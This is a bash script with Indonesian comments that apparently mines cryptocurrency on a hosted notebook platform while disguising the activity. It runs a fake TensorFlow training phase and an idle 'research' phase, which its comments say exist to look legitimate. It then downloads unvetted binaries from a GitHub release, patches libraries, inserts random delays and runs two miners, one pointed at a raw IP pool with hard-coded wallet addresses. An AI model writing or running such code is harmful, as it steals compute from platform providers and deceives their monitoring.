#!/bin/bash
# MINN v3 — binary beda, tanpa proxy, jeda panjang 25 menit
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(date +%s | md5sum | head -c 8)
echo "[MINN] Worker: $WRK"

# === 1. Warmup ML 10 menit ===
echo "[1/4] Warmup ML 10min..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np,time
m=tf.keras.Sequential([tf.keras.layers.Dense(128,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(64,activation='relu'),tf.keras.layers.Dense(10)])
m.compile(optimizer='adam',loss='sparse_categorical_crossentropy',metrics=['accuracy'])
x=np.random.rand(2000,784).astype(np.float32);y=np.random.randint(0,10,2000)
for e in range(5): m.fit(x,y,batch_size=32,epochs=1,verbose=2);time.sleep(30)
"

# === 2. Idle 15 menit — keliatan research ===
echo "[2/4] Idle 15min..."
python3 -c "
import time,numpy as np,random
for i in range(15):
    print(f'  [{i+1}/15] Computing batch {random.randint(100,999)}...')
    x=np.random.rand(512,512);np.dot(x,x.T);np.linalg.svd(x[:,:128])
    time.sleep(60)
"

# === 3. Download binary beda (golden, bukan fortune) ===
echo "[3/4] Download..."
rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/golden
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2
chmod +x golden sse2

# GLIBC buat golden
echo "[3/4] Setup libs..."
if [ ! -f ~/lib64/libstdc++.so.6 ] || ! strings ~/lib64/libstdc++.so.6 2>/dev/null | grep -q "GLIBCXX_3.4.29"; then
    mkdir -p ~/lib64
    wget -q -O ~/libstdc++.deb http://archive.ubuntu.com/ubuntu/pool/main/g/gcc-12/libstdc++6_12-20220319-1ubuntu1_amd64.deb
    cd ~; ar x libstdc++.deb 2>/dev/null; tar -xf data.tar.xz 2>/dev/null || (apt-get install -y -qq zstd 2>/dev/null; zstd -d data.tar.zst 2>/dev/null; tar -xf data.tar 2>/dev/null)
    cp -f usr/lib/x86_64-linux-gnu/libstdc++.so.6* ~/lib64/ 2>/dev/null; cd /content/m
fi
export LD_LIBRARY_PATH=~/lib64:$LD_LIBRARY_PATH

# === 4. Mining — 1 thread, CPU only, NO PROXY ===
echo "[4/4] Starting (1 thread, no proxy)..."
sleep $((RANDOM % 30 + 10))

# GOLDEN — no proxy
(while true; do
    ~/lib64/ld-linux-x86-64.so.2 --library-path ~/lib64:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu \
        ./golden --pubkey=2Kb9Jou5c9bScVHxsDoaZeTGyrr7aow4yCVTiHnNt68HTs24t6B23VV \
        --label="${WRK}" --mode=cpu --threads=1
    sleep 15
done) &
PID1=$!
sleep 20

# SSE2 — 1 thread
./sse2 -a yespowertide -o 47.251.244.12:80 -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
PID2=$!
echo "[MINN] GOLDEN:$PID1 SSE2:$PID2"
(sleep 10800; kill $PID1 $PID2 2>/dev/null; echo "[MINN] Done") &
wait